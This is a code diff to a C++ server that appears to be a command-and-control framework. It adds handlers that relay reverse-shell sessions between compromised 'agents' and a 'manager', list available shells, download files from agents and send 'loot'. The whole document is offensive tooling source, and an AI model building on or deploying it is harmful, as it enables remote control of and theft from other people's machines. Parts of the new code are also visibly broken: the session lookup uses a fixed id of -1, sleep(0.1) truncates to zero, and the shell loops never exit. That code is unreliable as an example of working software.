@@ -28,6 +28,7 @@ int ConnectionInstance::manager_handler() {
 
     if(!this->api_check(this->transport->get_agent_name(this->data)))
     {
+        free(resp);
         return 1;
     }
 
@@ -327,6 +328,7 @@ int ConnectionInstance::send_info(char *ptr){
         this->log("Failed to open directory\n", this->agent_name);
             
         perror ("");
+        free(tmpbf);
         return 2;
     }
     return 0;
@@ -359,7 +361,10 @@ int ConnectionInstance::download_file(char *ptr, int is_manager, char *extra){
     memset((void*)data_ptr, 0, size+1);
             
     // ready for data 
-    if(!this->api_check(this->transport->send_ok(this->data))) return 1;
+    if(!this->api_check(this->transport->send_ok(this->data))) {
+        free((void*)data_ptr);
+        return 1;
+    }
 
     // read data until we have read `size` bytes
     size_t tmpint = 0;
@@ -431,11 +436,31 @@ int ConnectionInstance::download_file(char *ptr, int is_manager, char *extra){
 
 /* Returns all available ports for accessing reverse shells */
 int ConnectionInstance::get_ports(char *ptr){
+    char *buff = (char*)malloc(1024);
+    char *idx = buff;
 
-    /*
-    UNIMPLEMENTED
-    */
-   return 0;
+    std::vector<ShellComms *> *session_vec = server->get_shell_sessions();
+
+    // loops over all current sessions and filters out
+    // the ones currently available to interact with
+    for (ShellComms *sess : *(session_vec))
+    {
+        if(sess->check_state(AWAIT_STATE)){
+            int sz = sprintf(idx, "%d,%s\n", sess->get_id(), sess->get_name());
+            idx += sz;
+        }
+    }
+
+    if(!this->api_check(this->transport->write(this->data, buff, idx-buff))){
+        free(buff);
+        idx = 0;
+        return 1;
+    }
+    
+    free(buff);
+    idx = 0;
+
+    return 0;
 }
 
 /* Sends information about available transport backends*/
@@ -492,14 +517,108 @@ int ConnectionInstance::send_transports(){
 int ConnectionInstance::reverse_shell(){
     printf("Waiting for shell handling...\n");
 
-    /*
-    UNIMPLEMENTED
-    */
+    int target_id = -1;
+
+    // gets the appropriate shell session from the server
+    std::vector<ShellComms *> *sessions = server->get_shell_sessions();
+    ShellComms *session = NULL;
+    for(ShellComms *s : *(sessions)){
+        if(s->get_id() == target_id){
+            session = s;
+            break;
+        }
+    } 
+    
+    if(session == NULL) {
+        this->log("Failed to find target session id", this->agent_name);
+        return 1;
+    }
+
+    // attepts to "initialize" a session
+    session->start_session();
+
+    // hand off to handlers
+    if(this->type == MANAG_TYPE) {
+        this->manager_shell_session(session);
+    } else {
+        this->agent_shell_session(session);
+    }
 
     while(this->shell_finished) sleep(1);
 
     return 1;
 }
+
+/* handles shell sessions for a manager */
+int ConnectionInstance::manager_shell_session(ShellComms *session){
+    void *dat = malloc(4096);
+    int b64_enc_sz = B64::enc_size(4096);
+    char *send_buff = (char*) malloc(b64_enc_sz);
+    // give time to update for other thread
+    sleep(0.1);
+
+    
+
+    // here starts the main loop
+    while(1){
+        if(session->check_state(MANAGE_STATE)){
+            session->wait_read(&dat, 4096, MANAGE_STATE);
+            B64::encode((const unsigned char *)dat, 4096, &send_buff);
+            if(!this->api_check(this->transport->write(this->data, send_buff, b64_enc_sz))){
+                free(dat);
+                free(send_buff);
+                return 1;
+            }
+        
+        } else if(session->check_state(ACTIVE_STATE)){
+            memset(dat, 0, 4096);
+            //  read data from the client
+            if(!this->api_check(this->transport->read(this->data, (char**)&dat, 4096))){
+                free(dat);
+                free(send_buff);
+                return 1;
+            }
+
+            // write it to session
+            session->wait_write(dat, 4096, AGENT_STATE);
+        }       
+        
+    }
+}
+
+/* handles shell sessions for agents*/
+int ConnectionInstance::agent_shell_session(ShellComms *session){
+    void *dat = malloc(4096);
+    int b64_enc_sz = B64::enc_size(4096);
+    char *send_buff = (char*) malloc(b64_enc_sz);
+    
+    // here starts the main loop
+    while(1){
+        if(session->check_state(AGENT_STATE)){
+            session->wait_read(&dat, 4096, AGENT_STATE);
+            B64::encode((const unsigned char *)dat, 4096, &send_buff);
+            if(!this->api_check(this->transport->write(this->data, send_buff, b64_enc_sz))){
+                free(dat);
+                free(send_buff);
+                return 1;
+            }
+        
+        } else if(session->check_state(ACTIVE_STATE)){
+            memset(dat, 0, 4096);
+            //  read data from the client
+            if(!this->api_check(this->transport->read(this->data, (char**)&dat, 4096))){
+                free(dat);
+                free(send_buff);
+                return 1;
+            }
+
+            // write it to session
+            session->wait_write(dat, 4096, MANAGE_STATE);
+        }       
+        
+    }
+}
+
 
 /*Handler for agent connections and flow*/
 int ConnectionInstance::agent_handler(){    
@@ -514,6 +633,14 @@ int ConnectionInstance::agent_handler(){
     char *resp = (char *)malloc(2048);
     char logbuff[BUFSIZ];
     
+    if(!this->api_check(this->transport->get_agent_name(this->data)))
+    {
+        free(resp);
+        return 1;
+    }
+
+    this->agent_name = (char *)this->data;
+
     // enters main handler loop
     while (!quitting)
     {
@@ -611,18 +738,18 @@ int ConnectionInstance::handle_connection(){
     // creates classes and instances
     if(!this->api_check(this->transport->determine_handler(this->data))) 
         return 1;
-    int handler = (int) this->api_data;
+    this->type = (int) this->api_data;
 
     // determines handler to use
-    if (handler == AGENT_TYPE) {
+    if (this->type == AGENT_TYPE) {
         printf("Starting agent handler\n");
         this->agent_handler();
-    } else if(handler == MANAG_TYPE) {
+    } else if(this->type == MANAG_TYPE) {
         printf("Starting manager handler\n");
         this->manager_handler();
     } else {
         // failed to handle the parsing :)
-        this->log("Got Unknown Handler Type: %d\n", "GENERIC", handler);
+        this->log("Got Unknown Handler Type: %d\n", "GENERIC", this->type);
         return 1;
     }
     return 0;
@@ -653,7 +780,7 @@ int ConnectionInstance::send_loot(char *ptr){
     char logbuff[BUFSIZ];
     char tmpbf[3];
     int count;
-    int ctr;
+    int ctr = 0;
     int size;
     int size_e;
     char *tmp_ptr2;
